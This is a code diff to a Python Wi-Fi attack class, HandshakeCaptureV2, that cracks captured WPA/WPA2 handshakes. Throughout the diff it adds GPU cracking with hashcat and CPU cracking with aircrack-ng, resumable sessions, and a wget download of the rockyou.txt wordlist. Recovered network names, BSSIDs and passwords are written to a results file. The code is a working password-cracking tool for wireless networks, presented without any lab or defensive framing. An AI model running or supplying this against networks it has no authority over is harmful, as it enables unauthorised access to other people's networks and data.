@@ -12,6 +12,7 @@ from modules.utils import (
     get_data_path,
     cleanup_temp_files
 )
+import json
 
 class HandshakeCaptureV2:
     def __init__(self):
@@ -266,25 +267,152 @@ class HandshakeCaptureV2:
             self.console.print(f"[red]Error verifying handshake: {str(e)}[/red]")
             return False
 
-    def crack_handshake(self, wordlist="/usr/share/wordlists/rockyou.txt"):
-        """Attempt to crack the captured handshake"""
+    def create_session(self, method, wordlist):
+        """Create a cracking session for resume capability"""
+        session_file = os.path.join(
+            self.data_path['passwords'],
+            f'session_{self.target_bssid.replace(":", "")}_{method}.session'
+        )
+        
+        session_data = {
+            'bssid': self.target_bssid,
+            'essid': self.target_essid,
+            'method': method,
+            'wordlist': wordlist,
+            'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
+            'progress': 0,
+            'status': 'running'
+        }
+        
+        with open(session_file, 'w') as f:
+            json.dump(session_data, f)
+            
+        return session_file
+
+    def load_session(self, session_file):
+        """Load an existing cracking session"""
         try:
-            if not os.path.exists(wordlist):
-                self.console.print(f"[red]Wordlist not found: {wordlist}[/red]")
+            with open(session_file, 'r') as f:
+                return json.load(f)
+        except:
+            return None
+
+    def update_session(self, session_file, progress, status='running'):
+        """Update session progress"""
+        try:
+            session_data = self.load_session(session_file)
+            if session_data:
+                session_data['progress'] = progress
+                session_data['status'] = status
+                with open(session_file, 'w') as f:
+                    json.dump(session_data, f)
+        except:
+            pass
+
+    def crack_with_hashcat(self, capfile, wordlist):
+        """Crack handshake using hashcat with GPU acceleration and session management"""
+        try:
+            # Convert cap to hccapx format for hashcat
+            hccapx_file = os.path.join(self.data_path['passwords'], f'hash_{self.target_bssid.replace(":", "")}.hccapx')
+            convert_cmd = [
+                'cap2hccapx',
+                capfile,
+                hccapx_file
+            ]
+            subprocess.run(convert_cmd, check=True)
+
+            if not os.path.exists(hccapx_file):
+                self.console.print("[red]Failed to convert capture file to hashcat format[/red]")
                 return False
-                
-            capfile = f"{self.capture_file}-01.cap"
-            if not os.path.exists(capfile):
-                self.console.print("[red]Capture file not found![/red]")
-                return False
-            
-            # Output file for password
-            password_file = os.path.join(
-                self.data_path['passwords'],
-                f'password_{self.target_bssid.replace(":", "")}.txt'
+
+            # Create or load session
+            session_file = self.create_session('hashcat', wordlist)
+
+            # Setup hashcat command with session and performance options
+            hashcat_cmd = [
+                'hashcat',
+                '-m', '2500',      # WPA/WPA2 mode
+                '-w', '3',         # Workload profile (1-4)
+                '--status',        # Enable status updates
+                '--restore',       # Enable session restore
+                '--session', os.path.splitext(session_file)[0],  # Session name
+                '-O',             # Optimize for performance
+                '--gpu-temp-abort=90',  # Prevent GPU overheating
+                '-o', os.path.join(self.data_path['passwords'], f'cracked_{self.target_bssid.replace(":", "")}.txt'),
+                hccapx_file,
+                wordlist
+            ]
+
+            # Ask for number of threads
+            try:
+                import multiprocessing
+                max_threads = multiprocessing.cpu_count()
+                threads = input(f"\nEnter number of threads (1-{max_threads}, default={max_threads}): ").strip()
+                if threads.isdigit() and 1 <= int(threads) <= max_threads:
+                    hashcat_cmd.extend(['-T', threads])
+            except:
+                pass
+
+            process = subprocess.Popen(
+                hashcat_cmd,
+                stdout=subprocess.PIPE,
+                stderr=subprocess.PIPE,
+                text=True,
+                universal_newlines=True
             )
-            
-            self.console.print("\n[yellow]Attempting to crack password...[/yellow]")
+
+            # Monitor progress
+            while True:
+                line = process.stdout.readline()
+                if not line and process.poll() is not None:
+                    break
+
+                # Update progress based on hashcat output
+                if "Progress" in line:
+                    progress = line.strip().split()[-1].rstrip('%')
+                    self.update_session(session_file, float(progress))
+                    self.console.print(f"[cyan]{line.strip()}[/cyan]", end='\r')
+                elif "Recovered" in line and "(" in line:
+                    password = line.split("(")[1].split(")")[0].strip()
+                    self.update_session(session_file, 100, 'completed')
+                    return password
+
+            self.update_session(session_file, 100, 'failed')
+            return None
+
+        except KeyboardInterrupt:
+            self.console.print("\n[yellow]Cracking paused. Session saved.[/yellow]")
+            self.update_session(session_file, -1, 'paused')
+            return None
+        except Exception as e:
+            self.console.print(f"[red]Error during GPU cracking: {str(e)}[/red]")
+            self.update_session(session_file, -1, 'error')
+            return None
+
+    def list_sessions(self):
+        """List all available cracking sessions"""
+        sessions = []
+        for file in os.listdir(self.data_path['passwords']):
+            if file.startswith('session_') and file.endswith('.session'):
+                session_data = self.load_session(os.path.join(self.data_path['passwords'], file))
+                if session_data:
+                    sessions.append(session_data)
+        return sessions
+
+    def resume_session(self, session_data):
+        """Resume a paused cracking session"""
+        self.target_bssid = session_data['bssid']
+        self.target_essid = session_data['essid']
+        
+        if session_data['method'] == 'hashcat':
+            return self.crack_with_hashcat(self.capture_file, session_data['wordlist'])
+        else:
+            return self.crack_with_aircrack(self.capture_file, session_data['wordlist'])
+
+    def crack_with_aircrack(self, capfile, wordlist):
+        """CPU-based cracking using aircrack-ng"""
+        try:
+            password_file = os.path.join(self.data_path['passwords'], f'password_{self.target_bssid.replace(":", "")}.txt')
             
             crack_cmd = [
                 'aircrack-ng',
@@ -303,44 +431,22 @@ class HandshakeCaptureV2:
                 universal_newlines=True
             )
             
-            password_found = False
             while True:
                 line = process.stdout.readline()
                 if not line and process.poll() is not None:
                     break
                     
                 if "KEY FOUND!" in line:
-                    password_found = True
-                    break
-                elif "Tested" in line:
+                    with open(password_file, 'r') as f:
+                        return f.read().strip()
+                elif "Tested" in line or "keys tested" in line.lower():
                     self.console.print(f"[cyan]{line.strip()}[/cyan]", end='\r')
             
-            if password_found and os.path.exists(password_file):
-                with open(password_file, 'r') as f:
-                    password = f.read().strip()
-                    
-                self.console.print(f"\n[green]Password found: {password}[/green]")
-                
-                # Save detailed results
-                results_file = os.path.join(
-                    self.data_path['passwords'],
-                    f'details_{self.target_bssid.replace(":", "")}.txt'
-                )
-                
-                with open(results_file, 'w') as f:
-                    f.write(f"Network: {self.target_essid}\n")
-                    f.write(f"BSSID: {self.target_bssid}\n")
-                    f.write(f"Password: {password}\n")
-                    f.write(f"Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
-                
-                return True
-            
-            self.console.print("\n[red]Password not found in wordlist![/red]")
-            return False
-            
+            return None
+
         except Exception as e:
-            self.console.print(f"[red]Error cracking handshake: {str(e)}[/red]")
-            return False
+            self.console.print(f"[red]Error during CPU cracking: {str(e)}[/red]")
+            return None
 
     def start_capture(self):
         """Main method to start handshake capture process"""
@@ -385,3 +491,114 @@ class HandshakeCaptureV2:
                 cleanup_temp_files()
             except:
                 pass 
+
+    def crack_handshake(self, wordlist="/usr/share/wordlists/rockyou.txt"):
+        """Attempt to crack the captured handshake using both CPU and GPU methods with session support"""
+        try:
+            # Check for existing sessions first
+            sessions = self.list_sessions()
+            if sessions:
+                self.console.print("\n[cyan]Found existing cracking sessions:[/cyan]")
+                for idx, session in enumerate(sessions, 1):
+                    status_color = {
+                        'running': 'yellow',
+                        'paused': 'cyan',
+                        'completed': 'green',
+                        'failed': 'red',
+                        'error': 'red'
+                    }.get(session['status'], 'white')
+                    
+                    self.console.print(
+                        f"{idx}. {session['essid']} ({session['bssid']}) - "
+                        f"Method: {session['method']}, "
+                        f"Progress: [{status_color}]{session['progress']}%[/{status_color}], "
+                        f"Status: [{status_color}]{session['status']}[/{status_color}]"
+                    )
+                
+                choice = input("\nResume session number (or press Enter for new session): ").strip()
+                if choice.isdigit() and 1 <= int(choice) <= len(sessions):
+                    return self.resume_session(sessions[int(choice) - 1])
+
+            # First check if we have a custom wordlist path in the data directory
+            custom_wordlist = os.path.join(self.data_path['passwords'], 'wordlist.txt')
+            if os.path.exists(custom_wordlist):
+                wordlist = custom_wordlist
+                self.console.print(f"[cyan]Using custom wordlist: {custom_wordlist}[/cyan]")
+            elif not os.path.exists(wordlist):
+                # Ask user for wordlist path if default doesn't exist
+                self.console.print(f"[yellow]Default wordlist not found: {wordlist}[/yellow]")
+                new_path = input("Enter path to wordlist (or press Enter to download rockyou.txt): ").strip()
+                
+                if new_path:
+                    if os.path.exists(new_path):
+                        wordlist = new_path
+                    else:
+                        self.console.print("[red]Invalid wordlist path![/red]")
+                        return False
+                else:
+                    # Option to download rockyou.txt
+                    self.console.print("[yellow]Attempting to download rockyou.txt...[/yellow]")
+                    try:
+                        download_cmd = [
+                            'wget',
+                            'https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt',
+                            '-O', custom_wordlist
+                        ]
+                        subprocess.run(download_cmd, check=True)
+                        wordlist = custom_wordlist
+                        self.console.print("[green]Successfully downloaded wordlist![/green]")
+                    except:
+                        self.console.print("[red]Failed to download wordlist. Please provide a valid wordlist path.[/red]")
+                        return False
+
+            capfile = f"{self.capture_file}-01.cap"
+            if not os.path.exists(capfile):
+                self.console.print("[red]Capture file not found![/red]")
+                return False
+
+            # Ask user for cracking method preference
+            self.console.print("\n[cyan]Available cracking methods:[/cyan]")
+            self.console.print("1. CPU-based (aircrack-ng) - Slower but more compatible")
+            self.console.print("2. GPU-based (hashcat) - Much faster, requires compatible GPU")
+            
+            choice = input("\nSelect cracking method (1/2): ").strip()
+            
+            if choice == "2":
+                self.console.print("\n[yellow]Starting GPU-based cracking with hashcat...[/yellow]")
+                password = self.crack_with_hashcat(capfile, wordlist)
+            else:
+                self.console.print("\n[yellow]Starting CPU-based cracking with aircrack-ng...[/yellow]")
+                password = self.crack_with_aircrack(capfile, wordlist)
+
+            if password:
+                self.console.print(f"\n[green]Password found: {password}[/green]")
+                
+                # Save detailed results
+                results_file = os.path.join(
+                    self.data_path['passwords'],
+                    f'details_{self.target_bssid.replace(":", "")}.txt'
+                )
+                
+                with open(results_file, 'w') as f:
+                    f.write("=== Cracking Results ===\n")
+                    f.write(f"Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
+                    f.write(f"Network Name: {self.target_essid}\n")
+                    f.write(f"BSSID: {self.target_bssid}\n")
+                    f.write(f"Channel: {self.target_channel}\n")
+                    f.write(f"Password: {password}\n")
+                    f.write(f"Wordlist Used: {wordlist}\n")
+                    f.write(f"Capture File: {capfile}\n")
+                    f.write(f"Cracking Method: {'GPU (hashcat)' if choice == '2' else 'CPU (aircrack-ng)'}\n")
+                
+                self.console.print(f"[green]Full details saved to: {results_file}[/green]")
+                return True
+            
+            self.console.print("\n[yellow]Password not found in wordlist. You can try:[/yellow]")
+            self.console.print("1. Use a different wordlist")
+            self.console.print("2. Try a different cracking method")
+            self.console.print("3. Capture a new handshake")
+            return False
+            
+        except Exception as e:
+            self.console.print(f"[red]Error during password cracking: {str(e)}[/red]")
+            return False 
